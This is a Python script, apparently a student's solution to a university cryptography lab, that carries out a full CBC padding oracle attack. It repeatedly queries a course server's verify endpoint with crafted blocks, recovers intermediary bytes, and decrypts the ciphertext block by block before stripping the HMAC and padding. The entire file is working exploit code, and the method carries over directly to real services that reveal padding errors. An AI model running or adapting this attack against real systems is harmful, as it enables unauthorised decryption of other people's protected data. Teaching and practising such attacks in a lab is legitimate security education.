#!/usr/bin/python3

# Run me like this:
# $ python3 padding_oracle.py "http://cpsc4200.mpese.com/username/paddingoracle/verify" "5a7793d3..."
# or select "Padding Oracle" from the VS Code debugger

import json
import sys
import time
from typing import Dict, List

import requests

SLEEP_INTERVAL: int = 10
INVALID_PADDING_STATUS: str = "invalid_padding"
AES_BLOCK_SIZE: int = 16
SHA256_DIGEST_SIZE: int = 32


# Create one session for each oracle request to share. This allows the
# underlying connection to be re-used, which speeds up subsequent requests!
s = requests.session()


def oracle(url: str, messages: List[bytes]) -> List[Dict[str, str]]:
    while True:
        try:
            r = s.post(url, data={"message": [m.hex() for m in messages]})
            r.raise_for_status()
            return r.json()
        # Under heavy server load, your request might time out. If this happens,
        # the function will automatically retry in 10 seconds for you.
        except requests.exceptions.RequestException as e:
            sys.stderr.write(str(e))
            sys.stderr.write("\nRetrying in 10 seconds...\n")
            time.sleep(10)
            continue
        except json.JSONDecodeError:
            sys.stderr.write("It's possible that the oracle server is overloaded right now,"
                             " or that provided URL is wrong.\n")
            sys.stderr.write("If this keeps happening, check the URL. Perhaps your uniqname is not set.\n")
            sys.stderr.write("Retrying in 10 seconds...\n\n")
            time.sleep(10)
            continue


def decrypt(oracle_url: str, cipher_bytes: bytes, number_of_blocks: int) -> bytearray:
    # mutable byte arrays
    # 2 chained blocks one being the IV and the other being the message we need to decode
    buster_bytes = bytearray(2 * AES_BLOCK_SIZE)
    intermediary_bytes = bytearray(AES_BLOCK_SIZE)
    # 1 less block since we only need to store data and not the IV
    decrypted_bytes = bytearray((number_of_blocks - 1) * AES_BLOCK_SIZE)
    # iterate though the blocks
    for i in range(0, number_of_blocks - 1):
        # if we are not at the begging block clean out the arrays
        if i > 0:
            fill_array(buster_bytes, 0, AES_BLOCK_SIZE, 0)
            fill_array(intermediary_bytes, 0, AES_BLOCK_SIZE, 0)
        # copy the data blocks from the original cipher_bytes into the second buster_bytes block
        array_copy(cipher_bytes, (i + 1) * AES_BLOCK_SIZE, buster_bytes, AES_BLOCK_SIZE, AES_BLOCK_SIZE)
        # call the helper method to decrypt a data block
        bust_block(oracle_url, cipher_bytes, i, buster_bytes, intermediary_bytes, decrypted_bytes)

    # when all blocks have been dealt with, we need to separate the data from the rest of the decrypted bytes
    full_length: int = len(decrypted_bytes)
    # take the last byte to determine how many blocks are padding
    padding_length: int = decrypted_bytes[full_length - 1]
    # subtract both the hmac and the padding
    message_length: int = full_length - SHA256_DIGEST_SIZE - padding_length
    # print(f"\n\nDECRYPTED BYTES: {decrypted_bytes.hex()}")
    # print(f"MESSAGE: {decrypted_bytes[:message_length].decode('utf-8')}")
    # print(f"HMAC: {decrypted_bytes[message_length:full_length - padding_length].hex()}")
    return decrypted_bytes[:message_length]


def bust_block(oracle_url: str,
               cipher_bytes: bytes,
               block_number: int,
               buster_bytes: bytearray,
               intermediary_bytes: bytearray,
               decrypted_bytes: bytearray):
    # begin traversing through the block, begging at the end of it and all the way to the start
    # essentially from indexes 15 to 0
    for i in range(AES_BLOCK_SIZE - 1, -1, -1):
        # print(f"IV byte[ {i} ]")
        # keep changing out the value of that byte until it is guessed correctly based on the oracle's
        # response
        for j in range(0, 256):
            # no need to change the value to 0, since that byte should already be cleaned out in the beginning
            if j > 0:
                buster_bytes[i] = j
            # print(f"    {j}: {buster_bytes.hex()}")
            # when you caught the correct value
            if oracle(oracle_url, [buster_bytes])[0]["status"] != INVALID_PADDING_STATUS:
                # padding is increasing each outer loop iteration
                padding = AES_BLOCK_SIZE - i
                # xor to get the intermediary_byte
                intermediary_byte = j ^ padding
                intermediary_bytes[i] = intermediary_byte
                # take the byte from the original IV at that same exact position and xor it with the
                # intermediary to get the final decrypted byte
                decrypted_byte = cipher_bytes[block_number * AES_BLOCK_SIZE + i] ^ intermediary_byte
                # print(f"    DECRYPTED: {decrypted_byte}")
                decrypted_bytes[block_number * AES_BLOCK_SIZE + i] = decrypted_byte
                # temporarily increment the padding
                padding += 1
                # assign new value(s) to the IV block calculated based on the new padding
                for k in range(AES_BLOCK_SIZE - 1, AES_BLOCK_SIZE - padding, -1):
                    buster_bytes[k] = intermediary_bytes[k] ^ padding
                break


# utility methods

def fill_array(array: bytearray, from_index: int, to_index: int, value: int):
    for i in range(from_index, to_index):
        array[i] = value


def array_copy(src: bytes, src_pos: int, dest: bytearray, dest_pos: int, length: int):
    for i in range(0, length):
        dest[dest_pos + i] = src[src_pos + i]


def main():
    if len(sys.argv) != 3:
        print(f"usage: {sys.argv[0]} ORACLE_URL CIPHERTEXT_HEX", file=sys.stderr)
        sys.exit(-1)
    oracle_url, ciphertext = sys.argv[1], sys.argv[2]

    # PERFORM PRELIMINARY VALIDATION ~ Sanity check: make sure the ciphertext is of good size and
    #                                                has a minimum of 4 blocks
    length = len(ciphertext)
    if length % (2 * AES_BLOCK_SIZE) != 0:
        print(f"invalid cipher text size: {length}", file=sys.stderr)
        sys.exit(-1)
    number_of_blocks: int = int(length / 2 / AES_BLOCK_SIZE)
    # should be at least 4 blocks: IV{1}, MESSAGE{1,}, HMAC{2}
    if number_of_blocks < 4:
        print(f"not enough cipher blocks: {number_of_blocks}", file=sys.stderr)
        sys.exit(-1)

    cipher_bytes = bytes.fromhex(ciphertext)

    if oracle(oracle_url, [cipher_bytes])[0]["status"] != "valid":
        print("Message invalid", file=sys.stderr)
        # if the ciphertext is not valid, don't even attempt to decode it using the server
        sys.exit(-1)

    decrypted = decrypt(oracle_url, cipher_bytes, number_of_blocks)
    # convert the bytes into actual readable text
    print(decrypted.decode('utf-8'))


if __name__ == '__main__':
    main()
